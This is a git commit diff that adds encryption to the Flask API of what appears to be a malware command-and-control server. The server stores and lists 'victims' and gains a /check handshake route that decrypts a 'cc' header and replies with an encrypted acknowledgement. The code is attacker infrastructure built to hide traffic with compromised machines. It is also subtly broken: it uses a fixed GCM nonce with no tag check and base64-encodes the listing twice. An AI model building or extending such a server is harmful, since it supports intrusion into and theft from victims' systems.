80b9f088ffa394c9c40d0b4f1905361b6a3cc6a4
yahya <yahyaoulha0@gmail.com>
2024-07-07 22:25:48 +0100

    added encryption and decryption to encryption class and added check route to the API to validate the cryptographic parameters are correct

--- api/models/encryption.py
+++ api/models/encryption.py
@@ -1,6 +1,8 @@
 """Encryption class"""
 from Crypto.Cipher import AES
 import json
+import bz2
+import base64
 
 
 class Encryption:
@@ -17,19 +19,55 @@ class Encryption:
         self.__EncryptionKey = bytes(data["key"], "utf-8")
         self.__IV = bytes(data["IV"], "utf-8")
 
-    def EncryptBuffer(self, buffer) -> bytes:
+    def EncryptBuffer(self, buffer) -> str:
         """
-        Encrypte given buffer.
+        Compresse then encrypte a given buffer.
         args:
-            @buffer (bytes): buffer that need to be encrypted.
+            @buffer (Any): buffer that need to be encrypted.
 
         return:
-            bytes: encrypted buffer.
+            str: encrypted buffer encoded with base64.
         """
+        if isinstance(buffer, dict):
+            buffer = json.dumps(buffer)
+        else:
+            buffer = str(buffer)
 
         cipher = AES.new(self.__EncryptionKey, AES.MODE_GCM, nonce=self.__IV)
-        ciphertext = cipher.encrypt(buffer)
-        return ciphertext
+
+        buffer = buffer.encode("utf-8")
+        buffer = bz2.compress(buffer)
+        buffer = cipher.encrypt(buffer)
+        buffer = base64.b64encode(buffer)
+
+        return buffer.decode("utf-8")
+
+    def DecryptBuffer(self, buffer) -> str:
+        """
+        Decompresse then decrypte a given buffer.
+        args:
+            @buffer (Any): buffer that need will be decrypted.
+
+        return:
+            str: decrypted buffer.
+        """
+        if isinstance(buffer, dict):
+            buffer = json.dumps(buffer)
+        else:
+            buffer = str(buffer)
+
+        cipher = AES.new(self.__EncryptionKey, AES.MODE_GCM, nonce=self.__IV)
+
+        buffer = buffer.encode("utf-8")
+        buffer = base64.b64decode(buffer)
+        buffer = cipher.decrypt(buffer)
+
+        try:
+            buffer = bz2.decompress(buffer)
+        except OSError:
+            return ""
+
+        return buffer.decode("utf-8")
 
     def get(self):
         return {"key": self.__EncryptionKey.decode("utf-8"), "IV": self.__IV.decode("utf-8")}
--- api/run.py
+++ api/run.py
@@ -1,11 +1,13 @@
-from flask import Flask, request, jsonify
-from api.models.victim import Victim
-from api.models.encryption import Encryption
+from flask import Flask, request, jsonify, Response
+import base64
+from models.victim import Victim
+from models.encryption import Encryption
 
 
 app = Flask(__name__)
 
 crypt = Encryption()
+
 
 @app.route("/up", methods=["POST"])
 def up():
@@ -28,8 +30,23 @@ def GetAll():
     return:
         List[dict] = list of dicts each contains information about victim's info
     """
+    data = Victim(None).AllVictims
+    data = crypt.EncryptBuffer(data)
+    data = base64.b64encode(data).decode("utf-8")
+    return Response(data, mimetype="text/plain", status=200)
 
-    return jsonify(Victim(None).AllVictims)
+
+@app.route("/check", methods=["GET"])
+def check():
+    message = request.headers.get("cc")
+    message = crypt.DecryptBuffer(message)
+    if message == "Are you ready?":
+        response = crypt.EncryptBuffer("yes daddy.")
+        response = {"cc": response}
+
+        return "", 200, response
+    else:
+        return "", 400
 
 
 if __name__ == '__main__':
